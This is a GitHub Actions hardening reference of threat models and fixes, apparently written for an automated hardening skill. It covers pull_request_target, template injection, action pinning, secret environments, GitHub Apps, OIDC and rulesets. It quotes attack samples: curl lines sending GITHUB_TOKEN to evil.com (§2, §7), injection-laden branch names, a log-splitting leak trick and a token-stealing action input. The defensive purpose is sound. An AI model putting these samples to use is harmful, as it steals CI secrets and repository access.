# Threat Models & Remediation Patterns

Detailed reference for the [gha-hardening](SKILL.md) skill. Threat models follow the [GitHub Security Lab series](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) (Parts 1–4).

## Fix table

The Gate runs zizmor with the auditor persona, offline. Each finding links its rule's documentation; these are the fixes that keep the workflow's behaviour.

| Finding | Fix |
|---|---|
| `unpinned-uses` | `scripts/pin-action.sh <action>@<ref>` with the ref as written: a full version (`v0.6.0`) stays that version, a major tag (`v4`) resolves to its latest release; keep the `# vX.Y.Z` comment it prints (`ref-version-mismatch` checks it). Major upgrades are Renovate's pull requests. Local actions (`./...`) stay as they are. |
| `excessive-permissions`, `undocumented-permissions` | Top-level `permissions: {}` (a comment on it moves to the job it explained); each job grants what its steps use, each grant with a comment saying what it reads or writes (`contents: read # checkout`, `issues: write # create and pin the dashboard issue`). |
| `secrets-outside-env` | The job declares its Secret Environment (§11). zizmor only checks the declaration; the secret moves through `migrate_secrets.py`, a Human Step. |
| `superfluous-actions` | Replace the action with the equivalent command (`gh release create`, `git`) when the result is the same ([release actions](#release-actions-to-gh-release-create)), and list the replacement in the Workflow Contract section of the pull request. |
| `artipacked` | `persist-credentials: false` on every `actions/checkout`. A job that pushes passes its token to that one step (§8). |
| `template-injection` | Move each `${{ }}` out of `run:` (and out of `script:` for `actions/github-script`) into step `env:`, then use `"$VAR"` (§2). `${{ env.X }}` is already an environment variable: it becomes `"$X"`, with no step `env:`. zizmor can report a repeated expression at the position of an earlier one in the same block (relais: the third `${{ env.VERSION_NAME }}` of a `run:` block, at line 101, reported at 99:27), so fix every `${{ }}` of a flagged block; per-rule counts follow zizmor's summary, repeats included. |
| `concurrency-limits` | Workflow-level `concurrency:`, group on `${{ github.workflow }}-${{ github.event.pull_request.number \|\| github.ref }}` for a workflow triggered by `pull_request`, `${{ github.workflow }}-${{ github.ref }}` otherwise; `cancel-in-progress: true` except on release and deploy workflows. |
| `anonymous-definition` | `name:` on the workflow and each job. A job `name:` renames its status check. |
| `dangerous-triggers` | Replace `pull_request_target` / `workflow_run` with `pull_request` when no secret is needed; otherwise run the §13 checklist, fix what fails, and propose a zizmor Exception whose reason is the guard. |
| `secrets-inherit`, `overprovisioned-secrets` | Pass each secret by name; `toJSON(secrets)` never. |
| `cache-poisoning` | No cache restore in release or publish jobs (`enable-cache: false`, no `cache:` input) (§6). |
| `use-trusted-publishing` | PyPI / npm publish through OIDC trusted publishing, then delete the token secret (Human Step). |
| `github-env` | Write to `$GITHUB_ENV` / `$GITHUB_PATH` only values the workflow builds itself. |
| `bot-conditions`, `unredacted-secrets`, `obfuscation`, `stale-action-refs`, other | Follow the rule's documentation; when the fix would change behaviour, it is a decision for the pull request. |

A strict-collection failure (a file zizmor cannot parse: Jinja or copier templates, test fixtures) cannot be excepted. Move the file out of `.github/` or `action.yml` names (e.g. `action.yml.jinja`), or rename the fixture directory.

### Release actions to `gh release create`

`gh release create <tag> [<files>...]` with `GH_TOKEN: ${{ github.token }}` in the step `env:` and `contents: write` on the job. Inputs of `softprops/action-gh-release`, `ncipollo/release-action` and `actions/create-release`:

| Result | softprops | ncipollo | create-release | `gh release create` |
|---|---|---|---|---|
| Tag | `tag_name` (default: the pushed tag) | `tag` (default: the pushed tag) | `tag_name` | first argument (`"$GITHUB_REF_NAME"` on a tag push) |
| Title | `name` (default: the tag) | `name` (default: the tag) | `release_name` | `--title` (default: the tag, or the generated title with `--generate-notes`) |
| Notes | `body`, `body_path`, `generate_release_notes` | `body`, `bodyFile`, `generateReleaseNotes` | `body`, `body_path` | `--notes`, `--notes-file`, `--generate-notes` |
| Files | `files` (globs, one per line) | `artifacts` (comma-separated) | none | paths after the tag (the shell expands globs) |
| Draft, prerelease | `draft`, `prerelease` | `draft`, `prerelease` | `draft`, `prerelease` | `--draft`, `--prerelease` |
| Missing file | ignored unless `fail_on_unmatched_files` | ignored unless `artifactErrorsFailBuild` | n/a | fails |
| Target of a new tag | `target_commitish` (default: the default branch) | `commit` (default: the default branch) | `commitish` (default: the current commit) | `--target` (default: the default branch); pass `"$GITHUB_SHA"` or `"$(git rev-parse HEAD)"` to tag the commit that was built |

An existing release for the tag: softprops updates it and ncipollo fails unless `allowUpdates`; `gh release create` fails. A workflow that relies on updating one keeps the action.

## Pitfalls

1. **A job `name:` renames its status check.** Required checks are matched by name. GitHub appends matrix values to a `name:` that has none (`name: test` gives `test (3.11)`), and an expression in `name:` replaces them.
2. **`with:` and template injection.** zizmor flags `with:` inputs that execute code (`actions/github-script`'s `script:`, `azure/cli`'s `inlineScript:`). Move the expression into step `env:` and read it from the script (`process.env.X`). Other inputs (`actions/checkout`'s `repository:`) are safe.
3. **Adding `environment:` to a job** scopes its secrets, and also applies the Environment's required reviewers: every run waits for approval. Check `gh api repos/<owner>/<repo>/environments/<env>` first.
4. **`github.token` cannot bypass rules.** A workflow that pushes to a protected branch fails; §12 has the two ways out, neither of them a personal access token.
5. **Ruleset bypass actor IDs are the App's ID** (`gh api apps/<slug> --jq .id`), not its installation ID.
6. **OIDC subject claims** contain `ref:`, which differs between branches and tags; some registries (Quay) need the claim customized (§9).

## Pull request body

Sections in this order, each omitted when empty except Human Steps. Commands meant for a human run from a giskard-actions checkout: `<scripts>` below is written `giskard-actions/skills/gha-hardening/scripts`.

1. **Fixed**: findings by rule, counts before → after, and the scan's first line (the giskard-actions ref) and summary line.
2. **Workflow Contract**: the script's table for each changed workflow, with one line of why per change: renamed checks, removed grants, replaced actions, comments that went with their line.
3. **Not run by CI**: each changed workflow the pull request's checks do not run (release, dispatch, schedule), and what to run after the merge to prove it still works; for a release change, the consumers and the version range each accepts (§12).
4. **Renovate**: what actually changes for this repository: the rows of the §14 table that change from its effective value, the keys removed because the preset sets them, and each kept key that overrides the preset, with its reason.
5. **Dependencies**: per project directory, the manager (and the one a converted project left), the lock and cooldown rules applied, the CI install command, the security-fix procedure with the open vulnerability pull requests the audit flags, and for a library that its consumers are unaffected; for each relock or conversion, what `compare_locks.py` shows moved, and for a conversion its checks; each install outside the lock with the source that would lock it; for any other manager (a Python one: why it stayed), which one, whether it has a lock and a cooldown, and its native setting (§15).
6. **Decisions needed**: each `(needs a decision)` commit (a release change named Tag version or Release App) and each remaining finding, with file:line, why zizmor flags it, the §13 checklist result for privileged triggers, and your recommendation.
7. **Checks already failing**: each failing check and each workflow shown failing in step 1 (saying it is not a check), with its cause, the run that shows it, and the fixing commit or the Human Step that fixes it.
8. **Human Steps**, in order, each one a command to run or a change to make; when none applies, one line saying nothing changes in settings before merging:
   1. Before merging: `python3 <scripts>/migrate_secrets.py --repo OWNER/REPO --env <name>:<policy>:<SECRET>[,<SECRET>] ... [--delete <UNUSED_SECRET>]` (plan with `--dry-run`), then rerun the pull request's checks: the jobs that read the secrets passing proves the migration.
      - A job that reads a secret and already fails (Checks already failing): the step names the error that proves the secret arrived (flare: 429 `credit_balance_exhausted`, not a missing or invalid key).
      - The failure is the secret's value: the new value goes into the Environment through the migration (or `--rotate` after it), never into the repository secret first.
      - The team replaces a dead secret with another (flare's OpenAI key, replaced by Azure AI keys): the job declares the Environment and nothing is migrated in this pull request. The step, for when the replacement lands: create the new Environment with the new secrets, then delete the old repository secret and the Environment GitHub created for this pull request.
   2. A personal access token, a deploy key with write access or reaching several repositories, or an App with more access than the job needs: `python3 <scripts>/setup_github_app.py --dry-run ...` filled in (§8; the release App's Environment is `github-release`). A read-only deploy key that clones one repository moves with the migration (item 1).
   3. Ruleset changes: required checks renamed, release tag creation reserved, an App bypass on an organization ruleset (org admin).
   4. Registry-side OIDC trust; Renovate installed on this repository.
   5. A job that reads secrets and runs on Dependabot pull requests: Dependabot security updates off, or the secrets added as Dependabot secrets (§11).
   6. Each check already failing for a cause outside the workflows, with its fix: the retired model to replace in `<config file>`, the new key to put into the Environment (item 1), the credits to add.

   Org-wide audit findings (`SENSITIVE` Apps, organization ruleset bypass) belong to the repo-baseline dashboard; leave them out.

---

## 1. `pull_request_target` — Privileged Code Execution

### Threat

`pull_request_target` runs with **write permissions and secret access**, even for PRs from forks. If the workflow checks out and executes PR code, the attacker gets arbitrary code execution in a privileged context.

### Dangerous Pattern

```yaml
# INSECURE — attacker code runs with secrets + write token
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - run: npm install && npm build
```

`npm install` executes attacker-controlled `preinstall`/`postinstall` scripts with full access to secrets and the `GITHUB_TOKEN`.

### Safe Alternatives

**Option A — Use `pull_request` instead (preferred when no privileged access needed):**

```yaml
on: pull_request
# Forks get read-only, no secrets — safe to build and test
```

**Option B — Two-workflow split (when you need privileged post-processing):**

Unprivileged workflow (`build.yml`):
```yaml
on: pull_request
steps:
  - uses: actions/checkout@<sha>
  - run: npm test
  - uses: actions/upload-artifact@<sha>
    with:
      name: results
      path: coverage/
```

Privileged workflow (`comment.yml`):
```yaml
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
    branches: [main]
steps:
  - uses: actions/download-artifact@<sha>
  # Process artifacts (DON'T execute them)
```

**Option C — Same-org guard (when only internal PRs need the workflow):**

```yaml
on: pull_request_target
jobs:
  build:
    if: github.event.pull_request.head.repo.owner.login == 'myorg'
```

### TOCTOU Attack

Even with approval labels, attackers can push malicious commits after labeling but before execution. Always checkout by `head.sha`:

```yaml
- uses: actions/checkout@<sha>
  with:
    ref: ${{ github.event.pull_request.head.sha }}  # immutable
    # NOT: ref: ${{ github.event.pull_request.head.ref }}  # mutable branch
```

### Non-Default Branch Vulnerability

Fixes on `main` don't protect other branches. If `release/1.0` still has the vulnerable workflow, attackers can target PRs against that branch. Close or rebase pre-existing PRs after fixing.

---

## 2. Script Injection via `${{ }}` Expressions

### Threat

GitHub evaluates `${{ }}` expressions and substitutes values into the shell script **before** the shell runs. This is template injection — the value becomes part of the script source.

### Dangerous Pattern

```yaml
- run: echo "${{ github.event.issue.title }}"
```

Issue title: `a"; curl http://evil.com?t=$GITHUB_TOKEN;#` → arbitrary command execution.

### Untrusted Context Fields

All of these are attacker-controlled:

- `github.event.issue.title` / `.body`
- `github.event.pull_request.title` / `.body` / `.head.ref` / `.head.label`
- `github.event.comment.body` / `github.event.review.body`
- `github.event.commits.*.message`
- `github.event.head_commit.message` / `.author.email` / `.author.name`
- `github.event.pull_request.head.repo.default_branch`
- `github.head_ref`

Branch names like `zzz";echo${IFS}"hello";#` are valid. Email addresses like `` `echo${IFS}hello`@domain.com `` are valid.

### Fix: Intermediate Environment Variables

```yaml
- name: Print title
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

The value is stored as a shell variable, not interpolated into the script template. Always double-quote the variable to avoid word splitting.

### `with:` Blocks — It Depends on the Action

Action inputs (`with:`) are passed as arguments, not used to generate shell scripts. However, some actions execute the input as code — these are **code-execution sinks**.

**Known code-execution sinks** (treat like `run:` — use `env:` + script variable):
- `actions/github-script` → `script:`
- `azure/cli` → `inlineScript:`
- `azure/powershell` → `inlineScript:`
- `jannekem/run-python-script-action` → `script:`
- `cardinalby/js-eval-action` → `expression:`

**Non-code-execution inputs** (safe — suppress pedantic findings with justification):

```yaml
- uses: some/action@<sha>
  with:
    title: ${{ github.event.pull_request.title }} # zizmor: ignore[template-injection] not a code-execution sink
```

---

## 3. Supply Chain — Third-Party Actions

### Threat

Any action you `uses:` gets access to compute time, job secrets, and the `GITHUB_TOKEN` (always available, even if not explicitly passed). A malicious action can extract the token via a hidden input default:

```yaml
# Inside the malicious action's action.yml
inputs:
  random_name:
    default: ${{ github.token }}
```

### Tag Mutability

Tags like `@v4` can be moved to point to a different commit at any time. If an action maintainer's account is compromised, the attacker replaces the tag target and every consumer runs the malicious version.

### Reference Safety Hierarchy

| Method | Safety | Notes |
|---|---|---|
| `@main` (branch) | Worst | Mutable, any push changes what runs |
| `@v4` (tag) | Moderate | Mutable, tags can be force-pushed |
| `@<short-sha>` | Bad | Deprecated, collision-vulnerable |
| **`@<full-40-char-sha>`** | **Best** | Immutable; use this |
| Fork the action | Best (with cost) | Full control, but requires manual updates |

Add a comment with the version for human readability:

```yaml
- uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
```

---

## 4. `workflow_run` Privilege Escalation

### Threat

`workflow_run` grants write permissions and secret access even if the triggering workflow had none. An attacker can submit a PR that modifies the triggering workflow's event list — since `pull_request` workflows run the PR's version, the modified workflow triggers the privileged `workflow_run`.

### Artifact Poisoning

Artifacts uploaded by an untrusted `pull_request` workflow are attacker-controlled. If the `workflow_run` workflow downloads and executes them, the attacker achieves code execution in a privileged context.

### Mitigations

```yaml
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
    branches: [main]  # Restrict to main branch only

jobs:
  process:
    if: github.event.workflow_run.event != 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@<sha>
        with:
          path: /tmp/artifacts  # Unzip to /tmp, not workspace
      # Validate contents before use
```

Repository owner checks (`github.repository_owner == 'myorg'`) are **NOT effective** — `workflow_run` always runs in the default branch context, which belongs to the org.

---

## 5. `issue_comment` / IssueOps

### Threat

Comment-triggered workflows (`/deploy`, `/approve`) are vulnerable to TOCTOU: an admin comments to approve, the attacker pushes a malicious commit before the workflow checks out.

`issue_comment` bypasses PR approval mechanisms and always runs the default branch workflow — repo checks are useless.

### Ineffective Mitigations

- **Actor checks**: the legitimate admin triggers the workflow, but the attacker controls the code.
- **Date checks**: attackers can forge commit dates.
- **Repo checks**: `issue_comment` always runs in the target repo context.

### Effective Mitigation: Label Gates

```yaml
on:
  pull_request:
    types: [labeled]

jobs:
  deploy:
    if: github.event.label.name == 'ready-to-deploy'
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # immutable
```

Label events include the commit SHA at label-time, closing the TOCTOU window.

---

## 6. Cache Poisoning

### Threat

Even with `permissions: {}`, a workflow can write to the Actions cache. A `pull_request_target` or `pull_request` workflow running attacker code can poison cache entries. When a privileged workflow (e.g., triggered by `push` to `main`) restores from that cache, the attacker achieves code execution in the privileged context.

### Mitigations

- Use immutable cache keys that include lockfile hashes.
- Don't share cache namespaces between privileged and unprivileged workflows.
- Consider `actions/cache/restore` (read-only) in privileged workflows instead of the full `actions/cache` action.

---

## 7. Secret Exfiltration Techniques

Understanding how attackers exfiltrate secrets helps you defend against it:

- **Environment variables**: `printenv` dumps all secrets set via `env:`.
- **Disk**: `actions/checkout` writes the token to `.git/config` unless `persist-credentials: false`. Generated shell scripts containing `${{ secrets.X }}` are on disk.
- **Log bypass**: GitHub redacts secrets in logs, but attackers split them: `echo ${SECRET:0:4}; echo ${SECRET:4:200}`.
- **HTTP exfiltration**: `curl http://evil.com?token=$GITHUB_TOKEN` — the token is valid until the workflow completes.

### Defenses

- Always set `persist-credentials: false` on `actions/checkout`.
- Scope secrets to step-level `env:`, not job/workflow level.
- Use `permissions:` to restrict the `GITHUB_TOKEN` to minimum needed scopes.
- For write tokens: prefer GitHub Apps (short-lived, scoped) over PATs (long-lived, broad).

---

## 8. GitHub App Pattern (Replace PATs)

One App per job that needs more than `github.token`: minimum permissions, installed on the one repository, credentials in an Environment deployable from one branch. `scripts/setup_github_app.py` does all of it through the manifest flow, so the private key never touches disk; with `--bypass-ruleset <id>` it also adds the App as a bypass actor of a repository ruleset.

```bash
python3 scripts/setup_github_app.py --org Giskard-AI --name <repo>-release \
  --repo Giskard-AI/<repo> --permission contents=write \
  --environment github-release --branch main \
  --client-id-variable RELEASE_APP_CLIENT_ID --private-key-secret RELEASE_APP_PRIVATE_KEY \
  --bypass-ruleset <ruleset-id> --dry-run
```

```yaml
jobs:
  release:
    environment: github-release
    permissions:
      contents: read # checkout; the App token pushes
    steps:
      - name: Generate release token
        id: app-token
        uses: actions/create-github-app-token@<sha> # vX.Y.Z
        with:
          client-id: ${{ vars.RELEASE_APP_CLIENT_ID }}
          private-key: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}
          permission-contents: write

      - uses: actions/checkout@<sha> # vX.Y.Z
        with:
          persist-credentials: false

      - name: Push
        env:
          APP_TOKEN: ${{ steps.app-token.outputs.token }}
          REPO: ${{ github.repository }}
        run: git push "https://x-access-token:${APP_TOKEN}@github.com/${REPO}.git" HEAD:main
```

The token lives one hour and only in the `env:` of the step that pushes. It goes in the push URL, never into `.git/config` (`git remote set-url`, a persisted checkout token): every later step of the job, third-party actions included, can read that file.

A job that clones another private repository with a personal access token gets an App installed on that repository instead: `--install-repo Giskard-AI/<other> --permission contents=read`, credentials still in the Environment of the repository that runs the job, and `repositories: <other>` on `create-github-app-token`.

A read-only deploy key that clones one repository stays a deploy key, in the job's Secret Environment, even when that Environment is deployable from every branch (pull request jobs): an App reading the same repository would not reduce what the key exposes. The audit's "Clone keys" lines print `read_only` for each repository a key clones (`gh api repos/<owner>/<cloned-repo>/keys`, which needs admin on that repository). When they say `unknown`, ask the human in the conversation; without an answer, assume read-only and state that assumption in the pull request. Replace the key with an App only when it has write access or reaches several repositories (the cloned repository has no deploy key: the secret is a user's SSH key). An App key keeps the rule of §11, an Environment restricted to its ref, so a pull request job that needs it is a decision.

---

## 9. OIDC Federation for Container Registries

The principle is the same for all registries: exchange a short-lived GitHub OIDC token for a registry-scoped credential. No static secrets stored.

All approaches require `id-token: write` permission on the job.

A login with a static password (`docker/login-action` with `password: ${{ secrets.* }}`) moves to the exchange for its registry, as `llm-hub` does for Quay. The registry-side trust (a federated robot account, an IAM role) is a Human Step; the static secret is deleted after the first green run.

### AWS ECR

```yaml
- uses: aws-actions/configure-aws-credentials@<sha>
  with:
    role-to-assume: arn:aws:iam::123456789012:role/my-github-actions-role
    aws-region: us-east-1

- uses: aws-actions/amazon-ecr-login@<sha>
```

### GCP Artifact Registry / GCR

```yaml
- uses: google-github-actions/auth@<sha>
  with:
    workload_identity_provider: projects/123456/locations/global/workloadIdentityPools/my-pool/providers/my-provider
    service_account: ci@my-project.iam.gserviceaccount.com

- uses: docker/login-action@<sha>
  with:
    registry: us-docker.pkg.dev
```

### Quay.io (manual token exchange)

```yaml
- name: Get Quay token via OIDC
  id: quay-token
  run: |
    OIDC_TOKEN=$(curl -sS \
      -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=quay.io" | jq -r '.value')
    QUAY_TOKEN=$(curl -sS \
      --user "org+robot:${OIDC_TOKEN}" \
      https://quay.io/oauth2/federation/robot/token | jq -r '.token')
    echo "::add-mask::${QUAY_TOKEN}"
    echo "token=${QUAY_TOKEN}" >> "$GITHUB_OUTPUT"

- uses: docker/login-action@<sha>
  with:
    registry: quay.io
    username: org+robot
    password: ${{ steps.quay-token.outputs.token }}
```

### OIDC Subject Claim Customization

The default GitHub OIDC subject includes `ref:` which differs between branches and tags. Some registries require customizing the claim so it matches regardless of trigger:

```bash
gh api repos/org/repo/actions/oidc/customization/sub \
  -X PUT --input - <<'EOF'
{"use_default": false, "include_claim_keys": ["repo"]}
EOF
```

---

## 10. Repository Rulesets vs. Classic Branch Protection

### The Problem with Classic Branch Protection

Classic branch protection has three separate bypass mechanisms, each covering different rules:

| Setting | What it bypasses |
|---|---|
| Push restrictions ("Restrict who can push") | Who can push directly |
| PR bypass ("Allow specified actors to bypass required pull requests") | PR requirement |
| *(none)* | **Required status checks — no bypass exists** |

This means a GitHub App that pushes release commits (version bumps, changelogs) will be blocked by required status checks even if it has push restriction and PR bypass. The push fails with:

```
remote: error: GH006: Protected branch update failed for refs/heads/main.
remote: - N of N required status checks are expected.
```

### Repository Rulesets Fix This

Repository rulesets support a single `bypass_actors` list that skips **all** rules — including required status checks. This is the only way to let an app push to a branch with required status checks without those checks passing first.

### Migration Procedure

1. **Read the current classic protection in full:**

   ```bash
   gh api repos/<owner>/<repo>/branches/main/protection
   ```

2. **Map each setting to a ruleset rule:**

   | Classic Setting | Ruleset Rule |
   |---|---|
   | Required status checks | `required_status_checks` (copy all `contexts` and `strict` flag) |
   | Required PR reviews | `pull_request` (copy `required_approving_review_count`, `dismiss_stale_reviews`, `require_last_push_approval`, etc.) |
   | Allow force pushes: false | `non_fast_forward` |
   | Allow deletions: false | `deletion` |
   | Block creations: true | `creation` |
   | Push restrictions (apps) | `bypass_actors` with `actor_type: Integration` |
   | PR bypass (apps) | Same `bypass_actors` entry covers this too |

3. **Get the app's database ID** (not the installation ID):

   ```bash
   gh api apps/<app-slug> --jq '.id'
   ```

4. **Create the ruleset**, then add the app as bypass actor: `scripts/setup_github_app.py --bypass-ruleset <id>` does it for a new App (§8).

5. **Verify the ruleset** is active and correct:

   ```bash
   gh api repos/<owner>/<repo>/rulesets/<id> --jq '{
     name, enforcement,
     bypass: [.bypass_actors[] | {actor_type, actor_id, bypass_mode}],
     rules: [.rules[].type],
     checks: [.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[].context]
   }'
   ```

6. **Delete classic protection only after verification:**

   ```bash
   gh api repos/<owner>/<repo>/branches/main/protection -X DELETE
   ```

### Gotchas

- The `actor_id` for `Integration` type is the **app's global database ID** (`gh api apps/<slug> --jq '.id'`), not the installation ID. Using the installation ID produces: "Actor integration must be part of the ruleset source or owner organization".
- Some `pull_request` rule parameters may not be supported in rulesets (e.g., `automatic_copilot_code_review_enabled`). If the API returns a validation error, remove the unsupported parameter and retry.
- Classic protection and rulesets can coexist — both are enforced. Delete classic protection only after confirming the ruleset covers everything, to avoid a window with no protection.
- After deleting classic protection, `gh api repos/<owner>/<repo>/branches/main/protection` returns 404 — this is expected. The ruleset is the active protection.

### Release tags

An organization ruleset blocks updating and deleting `v*` tags in every code repository. A repository whose workflows publish on a pushed `v*` tag also needs tag creation reserved: anyone who can push could otherwise publish a release. The Human Step: a repository ruleset on `refs/tags/v*` with the `creation` rule, bypassed only by the release App or the maintainers who tag.

---

## 11. Secret Environments

Every secret of a code repository lives in a **Secret Environment** (repo-baseline ADR 0002); zizmor's `secrets-outside-env` checks that each job reading a secret declares one.

- **Name**: `<service>-<usage>` when the job calls one service (`openai-tests`, `azure-codex-review`, `pypi-release`, `github-release` for a release App key), `<usage>` when it calls several (`e2e-tests`; a job that uses an API key and a clone key: `benchmark-tests` in safety-bench). An existing Environment off this convention is renamed when its repository is reworked: `migrate_secrets.py` creates the new one and asks for the values again (GitHub never returns them); deleting the old one is a Human Step once the pull request's run is green.
- **Deployment branches follow the trigger** (`migrate_secrets.py` policy in brackets): pull request jobs (any job that runs on `pull_request`, whatever else triggers it), every branch (`all`); push, dispatch or schedule on the default branch, that branch (`branch=main`); a pushed release tag, the tags (`tag=v*`). An Environment that holds a release or App key is restricted to its ref: when pull request jobs use it for other secrets, it splits in two, and a pull request job that needs the key itself is a decision. A read-only deploy key that clones one repository is not such a key: it stays in the pull request job's Environment, deployable from every branch (§8).
- **A job that publishes through OIDC trusted publishing and reads no secret declares no Environment**, unless the trusted publisher config (PyPI, npm) already names one: the job must then keep that name.
- **A secret two Environments need is copied into both**: the wizard asks for its value once and writes it to each. `--rotate NAME` rewrites every copy.
- **Pull request jobs declare `deployment: false`**, so they read the secrets without recording a deployment on the pull request:

```yaml
jobs:
  test:
    name: Test
    environment:
      name: openai-tests
      deployment: false
    steps:
      - name: Run integration tests
        env:
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        run: uv run pytest -m integration
```

- **Before the Human Step, the pull request's checks behave as before the migration.** A job that names an Environment that does not exist yet makes GitHub create it on the first run, empty and with no protection rules ([Managing environments](https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/manage-environments)), and the job still reads the repository secret: repository secrets reach every job, and an Environment secret of the same name overrides it ([Secrets reference](https://docs.github.com/en/actions/reference/security/secrets)). `migrate_secrets.py` then applies the policy to that Environment and writes the secrets.
- **Dependabot runs get no secrets.** A run Dependabot triggers reads only Dependabot secrets, never Actions or Environment secrets ([Dependabot on GitHub Actions](https://docs.github.com/en/code-security/dependabot/troubleshooting-dependabot/troubleshooting-dependabot-on-github-actions#accessing-secrets)), so a job that needs secrets fails on Dependabot pull requests whatever the hardening does; the audit splits each check's pull request runs by actor. The Human Step: when Renovate covers the repository, turn Dependabot security updates off (Settings, Advanced Security) and keep Dependabot alerts on, since Renovate reads them; otherwise add the secrets the job needs as Dependabot secrets, a separate store that only Dependabot runs read.
- **Reusable workflows**: a job that calls one cannot declare `environment:`; the called job must. When the reusable workflow takes an `environment` input (`codex-pr-review.yml` does: pass `azure-codex-review`), pass it; the secret it still lists under `secrets:` arrives empty from the caller and the called job reads it from the Environment. Otherwise list it under "Decisions needed": adding the input changes its Workflow Contract.

---

## 12. Releases that push to a protected branch

A release job that pushes its version commit to the default branch with `github.token` fails as soon as a ruleset requires pull requests or checks there: the job token cannot bypass rules. The audit lists such pushes. There are two ways out, **Tag version** and **Release App**; the pull request names the one it proposes under "Decisions needed", after the consumers check.

### Consumers check

Before changing how a package is released, list who consumes it. Search the org's manifests (the search needs network access and covers default branches only):

```bash
for manifest in pyproject.toml uv.lock requirements.txt package.json pnpm-lock.yaml package-lock.json; do
  gh search code --owner Giskard-AI --filename "${manifest}" "<package>" \
    --json repository,path --jq '.[] | "\(.repository.nameWithOwner) \(.path)"'
done
```

Read each hit for the version range it accepts (a lock file hit is a transitive or vendored consumer). List the consumers and their ranges under "Not run by CI", so the next version stays in the range they accept.

### Tag version

Recommended when the version commit is the only push. The build reads the version from a tag created on the runner, and `gh release create` pushes that tag with the release; nothing is pushed to the branch. For a hatchling project, in its own commit `build: read the version from the release tag (needs a decision)`:

```toml
[build-system]
requires = ["hatchling", "hatch-vcs"]
build-backend = "hatchling.build"

[project]
dynamic = ["version"] # was: version = "1.4.0"

[tool.hatch.version]
source = "vcs"
```

The release job, after relais' `create-release.yml`: validate, check out every tag, fail if the tag exists, tag locally, build, publish, then create the release on the commit that was built. A failed publish leaves no tag and no release.

```yaml
on:
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release, X.Y.Z"
        required: true
        type: string

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions: {}

jobs:
  release:
    name: Release
    runs-on: ubuntu-latest
    permissions:
      contents: write # create the GitHub release and its tag
      id-token: write # PyPI trusted publishing
    steps:
      - name: Validate the version
        env:
          VERSION: ${{ inputs.version }}
        run: |
          [[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]] || { echo "Use X.Y.Z"; exit 1; }
          echo "TAG=v$VERSION" >> "$GITHUB_ENV"

      - uses: actions/checkout@<sha> # vX.Y.Z
        with:
          fetch-depth: 0 # every tag, for hatch-vcs and the check below
          persist-credentials: false

      - name: Fail if the tag exists
        run: |
          if git rev-parse -q --verify "refs/tags/$TAG" >/dev/null; then
            echo "$TAG already exists"; exit 1
          fi

      - uses: astral-sh/setup-uv@<sha> # vX.Y.Z
        with:
          enable-cache: false

      # hatch-vcs reads the version from this tag; gh release create pushes it
      - name: Tag the release locally
        run: git tag "$TAG"

      - name: Build
        run: uv build

      - name: Publish to PyPI
        uses: pypa/gh-action-pypi-publish@<sha> # vX.Y.Z

      - name: Create the GitHub release
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh release create "$TAG" --target "$(git rev-parse HEAD)" --generate-notes dist/*.tar.gz dist/*.whl
```

The steps that go: the version edit tool (`toml-cli`, `sed` on `pyproject.toml`), the git author config, the version commit and its push, and the release action `gh release create` replaces.

Every other CI checkout is shallow and has no tags, so its builds get `0.1.devN+g<sha>`. Check that nothing reads `__version__` or `importlib.metadata.version()` expecting the release version (tests, a `--version` output, a user agent), and build once from a shallow clone to see it succeed.

### Release App

When the release pushes more than the version (changelog, generated files). One App per repository, created with `setup_github_app.py --bypass-ruleset <id>` (§8), its private key in the `github-release` Environment restricted to the default branch. Bypassing an organization ruleset needs an org admin.

---

## 13. Privileged triggers checklist

Run it on each workflow triggered by `pull_request_target`, `workflow_run` or `issue_comment`, before proposing any `dangerous-triggers` Exception, and report each item with the line that answers it in "Decisions needed":

1. **Code**: does any job check out, build or run code from the pull request (`head.sha`, `head.ref`, the merge ref) or execute a downloaded artifact? (§1, §4)
2. **Privileges**: which secrets and `write` grants do those jobs hold? A job that touches pull request code holds neither.
3. **Input**: is every attacker-controlled field (title, body, branch name, comment, artifact content) read through step `env:`, never `${{ }}` in `run:` or `script:`? (§2)
4. **Who**: can a fork or any commenter trigger it? Name the guard: same-repository check (`github.event.pull_request.head.repo.full_name == github.repository`), `author_association`, a label gate.
5. **Time of check**: does it check out the immutable SHA it approved, not a branch? (§1, §5)
6. **`workflow_run`**: are `branches:` restricted, and are artifacts unpacked outside the workspace and treated as data? (§4)
7. **Cache**: does it restore a cache an unprivileged workflow can write? (§6)

---

## 14. Renovate

Every repository extends `github>Giskard-AI/.github`, the shared preset (`default.json` of `Giskard-AI/.github`). What changes, from Renovate's defaults with `config:recommended` alone ([configuration options](https://docs.renovatebot.com/configuration-options/), [scheduling](https://docs.renovatebot.com/key-concepts/scheduling/)) to the shared preset:

| Setting | Before, with `config:recommended` alone | With the shared preset |
|---|---|---|
| Schedule (`schedule`, `timezone`) | at any time, UTC | Monday 00:00-06:59 Europe/Paris (`* 0-6 * * 1`) |
| Wait before proposing a new version (`minimumReleaseAge`) | none | 7 days; security fixes do not wait (they never did) |
| Vulnerability sources | GitHub alerts | GitHub alerts and OSV (`osvVulnerabilityAlerts`) |
| Grouping | one pull request per dependency, except the monorepos and groups of `group:recommended` | one pull request per package manager |
| Lock file maintenance | off | on, in its own pull request, same schedule |
| Hourly limit (`prHourlyLimit`) | 2 pull requests | none |
| Python interpreter (`requires-python`, `.python-version`) | no rule | never bumped |
| Labels | none | `dependencies` |
